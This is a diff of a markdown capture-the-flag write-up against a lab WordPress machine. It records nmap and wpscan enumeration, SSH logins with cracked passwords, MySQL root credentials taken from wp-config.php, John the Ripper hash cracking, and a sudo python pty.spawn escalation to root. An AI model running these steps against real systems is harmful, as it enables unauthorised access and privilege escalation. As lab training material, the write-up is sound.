@@ -6,13 +6,12 @@
 - Exploitation
 
 ### Exposed Services
-_TODO: Fill out the information below._
 
 Nmap scan results for each machine reveal the below services and OS details:
 
-```bash
-$ nmap -sV 192.168.1.110
-  SCREENSHOOT
+Command: $ nmap -sV 192.168.1.110
+  
+ ![](Images/Nmap Scan.png)
 
 
 This scan identifies the services below as potential points of entry:
@@ -27,61 +26,73 @@ This scan identifies the services below as potential points of entry:
 The following vulnerabilities were identified on each target:
 - Target 1
   - List of Critical Vulnerabilities
-Foloowing user were identified by running wpscan command
-wpscan --url http://192.168.1.110/wordpress --enumerate u
+Following user were identified by running wpscan command
+
+Command: wpscan --url http://192.168.1.110/wordpress --enumerate u
 -Micheal
 -Steven
 
-SCREENSHOOT
+![](Images/User.png)
 
-With a simple brut force user Michael password was cracked: Password was michael
+
+With a simple brut force user Michael password was cracked: Password was "michael"
 
  `flag1.txt`: 
     -Flag 1 was found in the following director:
     Command: cd /var/www/html
-        :ls -al
-        :nano services.html
-
-        SCREENSHOOT
+           : ls -al
+           : nano services.html
+           
+![](Images/Flag1.png)
+![](Images/Flag 2.png)
 
 `flag2.txt`:
     -Flage 2 was found in following directories:
      Command: cd /var/www/
             : ls -al
-        SCREENSHOOT
+
+![](Images/flag2.png)
 
 
 ### Exploitation
 
-Mysql server login credentials was listed in wp-config.php file
-steven account was used then to execue python to escalte root preveliage
+Mysql server login credentials was listed in wp-config.php file from where steven password was cracked using john ripper and his account was used then to execute python to escalte root preveliage. Following steps were involved
 
-
-SSH into Micheael account
+Step 1:
+-SSH into Michael account
 command: ssh micheal@192.168.1.110
 
-SCREENSHOOT
-Login credentials using MYSQL server were found in wp-config.php file within var/www/html/wordpress directory.
+-Login credentials using MYSQL server, were found in wp-config.php file within var/www/html/wordpress directory.
+
+-Flag 3 was found in the wp_posts table in the wordpress database.
+
 
 Command: mysql -u root -p
 password: R@v3nSecurity
-use wordpress;
-show table;
-SELECT * FROM wp_users
+  mysql> use wordpress;
+        show table;
+        SELECT * FROM wp_users;
+        SELECT * FROM wp_posts;
 
-SCREENSHOT
-SCREENSHOOT
+![](Images/WP TABLE.png)
+![](Images/Flag3.png)
 
 
-
-Password was cracke using john ripper
-
+Step 2:
+Password was cracke using john ripper uing following command
 command: john wp_hashes.txt
+user steven password is cracked: pink84
 
-user steven password is cracke: pink84
+Once the password hash was cracked, then SSH into Steven to execute python to escalte root privilege
+Command: ssh steven@192.168.1.110
+password: pink84
+        :sudo -l
+        :sudo python -c 'import pty;pty.spawn ('/bin/bash");'
+        :cd /root
+        :ls -al
+        :cat falg4.txt
+        
+![](Images/flag4.png)
 
-sude python -c 'import pty;pty.spawn ('bin/bash");'
-
-SCREENSHOOT
 
 
